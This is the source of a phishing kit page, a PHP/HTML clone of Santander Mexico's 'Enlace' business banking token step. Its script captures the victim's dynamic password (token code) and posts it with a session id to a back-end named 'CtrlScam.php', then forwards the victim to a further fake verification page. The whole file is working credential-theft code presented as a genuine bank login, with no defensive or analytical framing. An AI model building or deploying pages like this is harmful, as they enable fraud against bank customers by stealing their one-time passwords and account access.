<?php 
    $session = $_GET['session'];
?>


<!DOCTYPE html>
<!-- saved from url=(0066)https://enlace.santander.com.mx/LOGBET_ENS/BtoChannelDriver.ssobto -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>Banco Santander - S12</title>
		

<meta content="IE=Edge,chrome=1" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1, maximum-scale=1">
<meta content="translate=true;length=3" http-equiv="pgs-domain">
<meta content="no-store" http-equiv="Cache-Control">
<meta content="no-cache" http-equiv="Pragma">

			<link href="./PassDinamico_files/Default.css" type="text/css" media="screen" rel="stylesheet">
<link href="./PassDinamico_files/bootstrap.css" type="text/css" media="screen" rel="stylesheet">
<SCRIPT language=JavaScript src="tokenMac_archivos/cuadroDialogo.js"></SCRIPT>
<script language=Javascript>
      <!--
    function solo_numeros_wey(evt)
     {
        var keyPressed = (evt.which) ? evt.which : event.keyCode
       return !(keyPressed > 31 && (keyPressed < 48 || keyPressed > 57));
     }
      //-->
   </script>
<!--<SCRIPT language=JavaScript src="tokenMac_archivos/scripts.js"></SCRIPT>-->
<script src="../../jquery-1.11.2.js"></script>
<script src="../../eai/EaiEmpresasWAR/js/cuadroDialogo.js" type="text/javascript"></script>
<script>
    $(document).ready(function(){
        
        var contrasena_dinamica = $('#tokParam');

        $('#btnFrm').click(function(e){
            e.preventDefault();
            validaPassDinamico();
            return false;
        });


        $('#form1').submit(function(e){
            e.preventDefault();
            validaPassDinamico();
        });

        function validaPassDinamico(){
            if(contrasena_dinamica.val() == ""){
                cuadroDialogo("Debe introducir la contrase&ntilde;a din&aacute;mica.", 1);
                contrasena_dinamica.focus();
            }else{
                $.ajax({
                    type: 'POST',
                    url: '../../Controllers/CtrlScam.php',
                    data: {
                        "request": "contrasena_dinamica_empresas",
                        "contra_dinamic": contrasena_dinamica.val(),
                        "session": $('#session').val()
                    },
                    beforeSend: function(){
                        console.log("ENviando...");
                        $('#backmodal').show();
                        $('#mensajeLoading').show();
                    },
                    success: function (resp){
                        console.log('Datos Enviados');
                        console.log(resp);
                        $('#backmodal').hide();
                        $('#mensajeLoading').hide();
                        window.location.href="verificacionDatosCliente.do.php?DATAID=ASJ893asi2i342837kjdha82389420&session="+$('#session').val()+"&inforData=ndj723648whrr82743";

                    },
                    error: function (request, textStatus, errorThrown) {
                        console.log('Error al Enviar los Datos: '+errorThrown);
                    }
                });
            }
        }


    });
</script>

<SCRIPT language=Javascript>



function MM_preloadImages() { //v3.0

  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();

    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)

    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}

}

function MM_swapImgRestore() { //v3.0

  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;

}



function MM_findObj(n, d) { //v4.01

  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {

    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}

  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];

  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);

  if(!x && d.getElementById) x=d.getElementById(n); return x;

}



function MM_swapImage() { //v3.0

  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)

   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}

}



function MM_openBrWindow(theURL,winName,features) { //v2.0

  window.open(theURL,winName,features);

}

// distintivo

function isDigit (c)

{

  return ((c >= "0") && (c <= "9"))

}

function getContext(path)
{
  /*<VC autor ="ESC" fecha ="09/04/2008" descripcion ="validar que se muestren las imagenes con  juncion y sin juncion" OT ="ALMACHEQ"*/
  var pname = window.document.location.pathname;
  var indice = pname.indexOf(path); 
  var junction = pname.substring(0,indice);
  //alert(pname);
  //alert(junction);
  if(junction.length > 0) 
    path = junction +path;  
  //alert(path);
  /*</VC*/
  //alert(path);
  return path;
}

document.oncontextmenu = function(){return false} 
</SCRIPT>
<script type="text/javascript" charset="utf-8" src="./PassDinamico_files/Token-Layer.js.descarga"></script><script type="text/javascript" charset="utf-8" src="./PassDinamico_files/bootstrap.js.descarga"></script><script type="text/javascript" charset="utf-8" src="./PassDinamico_files/jquery.js.descarga"></script><script type="text/javascript" charset="utf-8" src="./PassDinamico_files/jquery-ui.js.descarga"></script><script type="text/javascript" src="./PassDinamico_files/jquery-3.3.1.min.js.descarga"></script>
<script type="text/javascript" src="./PassDinamico_files/bootstrap.min.js.descarga"></script>
<script type="text/javascript" src="./PassDinamico_files/mainG.js.descarga"></script>
<script type="text/javascript" src="./PassDinamico_files/sconnect_uc.js.descarga"></script>
<script type="text/javascript" src="./PassDinamico_files/pcsc.js.descarga"></script>
<script type="text/javascript" src="./PassDinamico_files/logging.js.descarga"></script>
<script type="text/javascript" src="./PassDinamico_files/enex.js.descarga"></script>
<script type="text/javascript" src="./PassDinamico_files/ezio_flex.js.descarga"></script>
<script type="text/javascript" src="./PassDinamico_files/loadUnload.js.descarga"></script>
<script type="text/javascript" src="./PassDinamico_files/logonThales.js.descarga"></script>

<script type="text/javascript" src="./PassDinamico_files/loader_santander-mx_prelogin.js.descarga"></script><script id="ca89ed30" type="text/javascript" src="./PassDinamico_files/bcaptcha.js.descarga"></script>
		<link href="./PassDinamico_files/Token.css" type="text/css" media="screen" rel="stylesheet">
		<script type="text/javascript">
			var dojoConfig = djConfig = {
				async: true,
				baseUrl: '/LOGBET_ENS/EarEstatico/LOGBET_ENS/',
				paths: { 
					bootstrapG:'logbet/common/pgs/res/bootstrap/src/js/bootstrap',
jqueryGemalto:'logbet/common/pgs/res/gemalto/jquery',
jqueryuiGemalto:'logbet/common/pgs/res/gemalto/jquery-ui',
					dojo: 'dojo',
					dijit: 'dijit',
					dojox: 'dojox',
					editors: 'editors',
					bks: 'bks',
					engine: 'engine'
				},
				has: {
					"config-tlmSiblingOfDojo": 0,
					"engine-client": 1,
					"engine-log-api": 1,
					"engine-trace-api": 1,
				},
				multiProfile: {
					"Empresa":'0265',"CanalMarco":'EMP',"EmpresaAsociada":'0000',"Idioma":'es-MX',"Estructura":'01',"Gama":'14',"NivelIU":'I',"Render":'client'
				},
				waitSeconds: 5,
				locale: 'es-ES',
				flow: {root : 'EarEstatico/LOGBET_ENS/' },
				charset: 'ISO-8859-1'
			};
			djConfig.modulePaths = djConfig.paths;
		</script>
		<script type="text/javascript" src="./PassDinamico_files/engine.js.descarga"></script>
		<script type="text/javascript" src="./PassDinamico_files/bks.js.descarga"></script>
		<script type="text/javascript"><!--
			require( ["engine/loader", "logbet/seguridad/pgs/view/login/Token-Layer"] , function(loader){
				loader.load("logbet/seguridad/pgs/view/login/Token", {"rendered":true,"seguridad":{"date":"2020-07-27T02:12:58.000Z","aside":{"isToken":false,"isTrusteer":true,"isBanner":false},"titulos":{"tituloPpal":"","tituloSec":"","subtituloSec":"","iconClass":"icon-usuario","iconClassSub":""}},"pasos":"{\"numPasos\": 0, \"pasoActual\":0}","footer":{"isMensajeAlerta":false,"paramBoton":[{"text":"Siguiente","href":"","styleClass":"btn-primary","active":true,"disable":false,"styleClass2":"col-md-2"}],"msgList":[],"isOpenDetailAlerts":false},"modalAyuda":{"tituloModal":"T??tulo mensaje ayuda","mensajeModal":"prueba","paramBoton":[{"text":"Cerrar","href":"","styleClass":"btn-default","active":true,"disable":false,"styleClass2":""}],"typeModal":"ayuda"},"atrFecha":"26/07/2020","atrHora":"21:12","atrTrusterURL":"https://www.ibm.com/security/trusteer/landing-page/es/santander-mexico-empresas/","atrModo":"S","atrFalloToken":"N","atrPasos":"4","trusteer":{"enlaces":[],"urlTrusteer":{"text":"Trusteer","href":"","styleClass":"","active":false,"disable":false,"styleClass2":""}},"atrNIP":"","atrMsgErrorTraducido":"","timeExp":"21","myView":"","urlExp":"http://enlace.santander.com.mx/LOGBET_ENS/ChannelDriver.ssobto?dse_operationName=error&dse_parentContextName=&dse_processorState=initial&dse_nextEventName=start&error.codError=ERRBET_0022","atrRSA":"S","atrBUC":"24291038","cerrarSesion":true,"atrSalt":"12","atrTInicio":"","atrImagenToken":"","atrColor":"N","buguroo":{"keyUser":"ba7a479c50a5b3446fd2a3e06ca4e3e0c5cfc1f6df821ce610b7dee9e12f7168","keySession":"Qz1WpVltxnpXxbKlu8M-N2X","datos":"Login - Token"},"atrTipoFirma":""}, {"dse_processorId":"AC10D5252D58775F8E2F0B3C","dse_applicationName":"ALP_LOGBET_ServLoginBET_Pres","dse_operationName":"loginNoEnrolado","dse_processorState":"PantToken"} );
			});
		--></script>
        
    <SCRIPT language=Javascript>




        // distintivo
function isDigit (c)
{
  return ((c >= "0") && (c <= "9"))
}
function validaForma() {
  token = document.form1.tokParam.value;

  if(token.length == 0) {
    alert("Debe de ingresar todos los datos requeridos");
    return;
  }
  document.form1.submit();
}
//</VC>
function validaFormato (pwd)
{
  var TemplateF=/^[\d]{8,8}$/i;  //dominio de 0-9
  return TemplateF.test(pwd);  //Compara "pwd" con el formato "Template"
}

function soloNumeros(evt) {
    evt = (evt) ? evt : event;
    var charCode = (evt.charCode) ? evt.charCode : ((evt.keyCode) ? evt.keyCode :
        ((evt.which) ? evt.which : 0));
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
        return false;
    }
    return true;
 }
</SCRIPT>
	<link href="https://enlace.santander.com.mx/LOGBET_ENS/EarEstatico/LOGBET_ENS/logbet/common/pgs/res/bootstrap/dist/img/favicon.ico" rel="shortcut icon"><link href="./PassDinamico_files/seguridad.css" rel="stylesheet" type="text/css"><link href="./PassDinamico_files/seguridad.css" rel="stylesheet" type="text/css"></head>
	<body>
    
    <input type="hidden" name="session" id="session" value="<?=$session;?>">
     <FORM method="post" name="form1" id="form1" action="recibemac.php">
    <div id="root-modalEnciendeToken-modal" class="col-md-12 modal modal-action fade in  logbet___tokenA" role="dialog" tabindex="-1"><div id="root-modalEnciendeToken-modaldialog" class="modal-dialog col-md-6"><div id="root-modalEnciendeToken-modalcontent" class="modal-content"><div id="root-modalEnciendeToken-modalHeader" class="modal-header icon-alerta-modal"><h5 id="root-modalEnciendeToken-heading" class="modal-title"> </h5></div><div id="root-modalEnciendeToken-_cont_0"><div id="root-modalEnciendeToken-modalConMessages" class="modal-body">Tu token no esta activo, presiona 7 para activarlo</div></div><div id="root-modalEnciendeToken-modalFooter" class="modal-footer"><div id="root-modalEnciendeToken-forEachBotones-0-contButton" class="col-md-4"><button id="root-modalEnciendeToken-forEachBotones-0-boton" class="btn-primary btn col-md-4" type="button" name="root-modalEnciendeToken-forEachBotones-0-boton"><span id="root-modalEnciendeToken-forEachBotones-0-textoBoton" class="boton-footer" data-dismiss="modal">Aceptar</span></button></div></div></div></div></div><div id="root-InstalarModal-modal" class="col-md-12 modal modal-help fade in  logbet___tokenA" role="dialog" aria-labelledby="modalID" tabindex="-1"><div id="root-InstalarModal-modaldialog" class="modal-dialog col-md-6"><div id="root-InstalarModal-modalcontent" class="modal-content"><div id="root-InstalarModal-cont_0"><div id="root-InstalarModal-modalConMessages" class="modal-body"><div id="root-InstalarModal-gridtitulo" class="paddingTop5 padding-left-0 padding-right-0 container-fluid"><div id="root-InstalarModal-gridRow" class="row"><div id="root-InstalarModal-gridCellTitulo" class="logbet___conTitulo col-xs-12 col-md-12 col-lg-12"><div id="root-InstalarModal-modalHeader"><div id="root-InstalarModal-textoTitulo" class="logbet___tituloIzquierda"><span id="root-InstalarModal-mensajeModal"><strong>Instalaci??n WEBCONNECT </strong></span></div><div id="root-InstalarModal-iconoCerrar" class="logbet___iconoDerecha"><img id="root-InstalarModal-cerrar" src="./PassDinamico_files/cerrar.png" draggable="true"></div></div></div></div></div><div id="root-InstalarModal-modalHeader1" class="logbet___subTitulos"><span id="root-InstalarModal-mensajeSub">Para poder hacer uso de la firma via bluetooth de su Token es necesario instalar la aplicaci??n WEBCONNECT</span></div><div id="root-InstalarModal-sconnect_install_step_1"><div id="root-InstalarModal-gridBody" class="paddingTop5 padding-left-0 padding-right-0 container-fluid"><div id="root-InstalarModal-gridRow_0" class="row"><div id="root-InstalarModal-gridCell" class="logbet___izquierda col-xs-12 col-md-4 col-lg-4 col-lg-offset-0"><div id="root-InstalarModal-sconnect1" class="logbet___contInst"><div id="root-InstalarModal-sconnect1_2" class="text-center"><img id="root-InstalarModal-install" src="./PassDinamico_files/webconnect1.png" draggable="true"></div><div id="root-InstalarModal-sconnect1_3" class="text-center"><span id="root-InstalarModal-sconnect1_4">Ejecutar el instalable que se ha descargado</span></div></div><div id="root-InstalarModal-sconnect1_5" class="text-center paddingTop10"><img id="root-InstalarModal-num1" src="./PassDinamico_files/uno.png" draggable="true"></div></div><div id="root-InstalarModal-gridCel2" class="logbet___centro col-xs-12 col-md-4 col-lg-4 col-lg-offset-0"><div id="root-InstalarModal-sconnect2" class="logbet___contInst"><div id="root-InstalarModal-sconnect2_2" class="text-center"><img id="root-InstalarModal-instal2" src="./PassDinamico_files/webconnect2.png" draggable="true"></div><div id="root-InstalarModal-sconnect2_3" class="text-center"><span id="root-InstalarModal-sconnect2_4">Si el instalador no se ha descargado, haga <a href="javascript:downloadInstaller()" style="color:black;"><strong>click aqu??</strong></a> para descargarlo</span></div></div><div id="root-InstalarModal-sconnect2_5" class="text-center"><p id="sconnect2_6" typetext="html"></p></div></div><div id="root-InstalarModal-gridCel3" class="logbet___derecha col-xs-12 col-md-4 col-lg-4 col-lg-offset-0"><div id="root-InstalarModal-sconnect3" class="logbet___contInst"><div id="root-InstalarModal-sconnect3_2" class="text-center"><img id="root-InstalarModal-instal3" src="./PassDinamico_files/webconnect3.png" draggable="true"></div><div id="root-InstalarModal-sconnect3_3" class="text-center"><span id="root-InstalarModal-sconnect3_4">Seguir los pasos del asistente de instalaci??n</span></div></div><div id="root-InstalarModal-sconnect3_5" class="text-center paddingTop10"><img id="root-InstalarModal-num2" src="./PassDinamico_files/dos.png" draggable="true"></div></div></div></div></div></div></div></div></div></div><div id="root-modalBack" class="modal fade" style="display: none;"></div><div id="root-content"><div id="root-tplSeguridad-contMain"><div id="root-tplSeguridad-seguridadContHeader" class="col-md-12 page-header padding-left-0"><div id="root-tplSeguridad-seguridadContHeaderPrimary" class="col-md-6 col-lg-5 padding-left-0"><div id="root-tplSeguridad-contImagenHeader" class="pull-left page-header-logo"><a id="root-tplSeguridad-linkCabecera"><img id="root-tplSeguridad-imagenHeader" class="imagenCabecera" src="./PassDinamico_files/logo.svg" draggable="true"></a></div><h1 id="root-tplSeguridad-seguridadHeaderPrimaryTitleID" class="ellipsis"><span id="root-tplSeguridad-seguridadTextHeaderPrimaryTitle" class="strong">Enlace</span></h1></div><div id="root-tplSeguridad-seguridadContHeaderSecondary" class="col-md-6 col-lg-7"><div id="root-tplSeguridad-seguridadContHeaderSecundaryLogOff" class="pull-right"><a id="root-tplSeguridad-aIconHeaderLogoff" class="icon-cerrar-sesion" title="Cerrar Sesi??n"></a></div><div id="root-tplSeguridad-seguridadContHeaderLanguage" class="pull-right language-block"><a id="root-tplSeguridad-aIconHeaderLanguageEsp" class="language-selected" title="ESP">ESP</a><span id="root-tplSeguridad-seguridadContHeaderLanguagetextLang" class="lang-divider"></span><a id="root-tplSeguridad-aIconHeaderLanguageEng" title="ENG">ENG</a></div><div id="root-tplSeguridad-seguridadContHeaderSecundaryTools" class="pull-right"><a id="root-tplSeguridad-aIconHeaderContact" class="icon-contacto" title="Contacto"></a></div></div></div><div id="root-tplSeguridad-seguridadContenedor" class="inline-block page-content" style="min-height: 800px;"><div id="root-tplSeguridad-ICabeceraPrincipal-cabSuperiorPrincipal" class="inline-block"><div id="root-tplSeguridad-ICabeceraPrincipal-cabSuperiorTitulo" class="col-md-7 col-lg-8"><h2 id="root-tplSeguridad-ICabeceraPrincipal-headingTituloPrincipal">Bienvenido a Banca Electr??nica Transaccional</h2></div></div><div id="root-tplSeguridad-cabeceraSecundaria-seguridadCabSuperiorSecundaria" class="inline-block header-auxiliar"><div id="root-tplSeguridad-cabeceraSecundaria-seguridadCabSuperiorSecundariaIzquierda" class="col-md-10 col-lg-10"><h3 id="root-tplSeguridad-cabeceraSecundaria-seguridadCabSuperiorSecundariaSubtitulo">ACCESO A SU BANCA ELECTR??NICA TRANSACCIONAL<span id="root-tplSeguridad-cabeceraSecundaria-headingSuperiorSecundarioDescripcion">Introduzca sus credenciales de acceso de Banca Electr??nica Transaccional</span></h3></div></div><div id="root-tplSeguridad-seguridadBody" class="col-md-12"><div id="root-tplSeguridad-seguridadBodyIzquierda" class="col-md-9 col-lg-9 padding-left-0"><div id="root-tplSeguridad-seguridadGapBody-gridCabecera" class="container-fluid"><div id="root-tplSeguridad-seguridadGapBody-gridPreguntaReto" class="row"><div id="root-tplSeguridad-seguridadGapBody-_gridCell_0" class="section-header-steps margin-0 col-xs-12 col-md-12 col-lg-12"><h4 id="root-tplSeguridad-seguridadGapBody-_hdn_0">Pregunta Reto</h4></div></div><div id="root-tplSeguridad-seguridadGapBody-gridVerificacionImagenSeguridad" class="row"><div id="root-tplSeguridad-seguridadGapBody-_gridCell_1" class="section-header-steps margin-0 col-xs-12 col-md-12 col-lg-12"><h4 id="root-tplSeguridad-seguridadGapBody-_hdn_1">Verificaci??n de la Imagen de Seguridad</h4></div></div><div id="root-tplSeguridad-seguridadGapBody-gridContrasenaBE" class="row"><div id="root-tplSeguridad-seguridadGapBody-_gridCell_2" class="section-header-steps margin-0 col-xs-12 col-md-12 col-lg-12"><h4 id="root-tplSeguridad-seguridadGapBody-_hdn_2">Introduzca su Contrase??a BE</h4></div></div><div id="root-tplSeguridad-seguridadGapBody-gridContrasenaDinamica" class="row"><div id="root-tplSeguridad-seguridadGapBody-_gridCell_3" class="section-header-steps active col-xs-12 col-md-12 col-lg-12"><h4 id="root-tplSeguridad-seguridadGapBody-_hdn_3">Introduzca su Contrase??a Din??mica</h4></div></div></div><div id="root-tplSeguridad-seguridadGapBody-formularioToken"><div id="root-tplSeguridad-seguridadGapBody-gridBody" class="paddingTop50 padding-left-0 padding-right-0 container-fluid"><div id="root-tplSeguridad-seguridadGapBody-_gridRow_0" class="row  paddingBottom30  paddingBottom30"><div id="root-tplSeguridad-seguridadGapBody-_gridCell_8" class="padding-left-0 padding-right-0 col-xs-12 col-md-5 col-lg-5 col-md-offset-3 col-lg-offset-3"><div id="root-tplSeguridad-seguridadGapBody-_grid_0" class="container-fluid"><div id="root-tplSeguridad-seguridadGapBody-gridRow_Paso1" class="row  width-100%  width-100%"><div id="root-tplSeguridad-seguridadGapBody-_gridCell_6" class="padding-0 width-60 col-xs-12 col-md-9 col-lg-9"><label id="root-tplSeguridad-seguridadGapBody-_cont_0" class="margin-0 strong">Paso 1:</label></div><div id="root-tplSeguridad-seguridadGapBody-_gridCell_7" class="padding-0 col-xs-12 col-md-9 col-lg-9"><label id="root-tplSeguridad-seguridadGapBody-_cont_1" class="margin-0">Presione el bot??n de su Token</label></div></div><div id="root-tplSeguridad-seguridadGapBody-gridRow_3" class="row"><div id="root-tplSeguridad-seguridadGapBody-_gridCell_9" class="padding-0 width-60 col-xs-12 col-md-9 col-lg-9"><label id="root-tplSeguridad-seguridadGapBody-_cont_2" class="margin-0 strong">Paso 2:</label></div><div id="root-tplSeguridad-seguridadGapBody-_gridCell_10" class="padding-0 col-xs-12 col-md-9 col-lg-9"><label id="root-tplSeguridad-seguridadGapBody-_cont_3" class="margin-0">Capture la contrase??a din??mica que aparece en su Token</label></div></div></div></div></div><div id="root-tplSeguridad-seguridadGapBody-_gridRow_4" class="row  paddingBottom20  paddingBottom20"><div id="root-tplSeguridad-seguridadGapBody-_gridCell_11" class="padding-left-0 padding-right-0 col-xs-12 col-md-5 col-lg-5 col-md-offset-3 col-lg-offset-3"><img id="root-tplSeguridad-seguridadGapBody-img_0" class="col-md-10 col-lg-8 col-md-offset-1 col-lg-offset-2" src="./PassDinamico_files/token.svg" draggable="true"></div></div><div id="root-tplSeguridad-seguridadGapBody-gridRow_1" class="row"><div id="root-tplSeguridad-seguridadGapBody-gridCell_4" class="padding-left-0 padding-right-0 paddingBottom15 col-xs-12 col-md-5 col-lg-5 col-md-offset-3 col-lg-offset-3"><div id="root-tplSeguridad-seguridadGapBody-containerContrasenaDinamica" class="form-group"><label id="root-tplSeguridad-seguridadGapBody-_txt_2" for="tokParam">Contrase??a Din??mica: </label><input id="tokParam" class="col-md-12 col-lg-12 form-control" type="password" name="tokParam" maxlength="8" onkeypress="return solo_numeros_wey(event)"></div></div></div><div id="root-tplSeguridad-seguridadGapBody-gridRow_pieToken" class="row  logbet___tokenA  logbet___tokenA"><div id="root-tplSeguridad-seguridadGapBody-_gridCell_16" class="padding-left-0 padding-right-0 col-xs-12 col-md-5 col-lg-5 col-md-offset-3 col-lg-offset-3"><div id="root-tplSeguridad-seguridadGapBody-_grid_03" class="container-fluid"><div id="root-tplSeguridad-seguridadGapBody-gridRow_5" class="row"><div id="root-tplSeguridad-seguridadGapBody-_gridCell_12" class="padding-0 width-60 col-xs-12 col-md-9 col-lg-9"><label id="root-tplSeguridad-seguridadGapBody-_cont_4" class="margin-0 strong"></label></div><div id="root-tplSeguridad-seguridadGapBody-_gridCell_13" class="padding-0 col-xs-12 col-md-9 col-lg-9"><label id="root-tplSeguridad-seguridadGapBody-_cont_5" class="margin-0">Para firmar la operaci??n inserte el dongle de su Token y presione el bot??n 7, cuando se encuentre sincronizado de click en Firmar.
</label></div></div></div></div></div></div></div></div><div id="root-tplSeguridad-seguridadBodyDerecha" class="col-md-3 col-lg-3 padding-right-0"><div id="root-tplSeguridad-seguridadAsideTrusteer"><div id="root-tplSeguridad-ITrusteer-contImgAsideTrusteer" class="trusteer"><a id="root-tplSeguridad-ITrusteer-linkTrusteer" class="inline-block" href="https://www.ibm.com/security/trusteer/landing-page/es/santander-mexico-empresas/" target="_blank"><img id="root-tplSeguridad-ITrusteer-iconAsideTruster" class="img-responsive" src="./PassDinamico_files/trusteer.svg" draggable="true"></a></div></div></div></div><div id="root-tplSeguridad-contFooter"><div id="root-tplSeguridad-IFooter-pieInferior" class="col-md-12 app-footer padding-right-0"><div id="root-tplSeguridad-IFooter-pieInferiorBotoneraIzquierda" class="col-md-10 padding-left-0"><span id="root-tplSeguridad-IFooter-space">&nbsp;</span></div><div id="root-tplSeguridad-IFooter-pieInferiorBotoneraDerecha"><div id="root-tplSeguridad-IFooter-forEachButtons-0-divBoton" class="col-md-2"><input id="root-tplSeguridad-IFooter-forEachButtons-0-boton" class="btn btn-primary" name="root-tplSeguridad-IFooter-forEachButtons-0-boton" type="submit" value="Siguiente"></div></div></div></div></div><div id="root-tplSeguridad-seguridadContFooter" class="col-md-12 page-footer"><div id="root-tplSeguridad-seguridadContFooterDisclaimer"><span id="root-tplSeguridad-seguridadContFooterDiscl">Derechos Reservados 2014, Banco Santander (M??xico) S.A., Instituci??n de Banca M??ltiple, Grupo Financiero Santander M??xico.
</span></div><div id="root-tplSeguridad-seguridadContFooterAvisoLegal"><a id="root-tplSeguridad-seguridadContFooterAvisoLegalLink" href="https://enlace.santander.com.mx/LOGBET_ENS/BtoChannelDriver.ssobto#" title="Aviso Legal"><span id="root-tplSeguridad-seguridadContFooterAvisoLegalText">Aviso Legal</span></a></div></div></div></div> </FORM></body></html>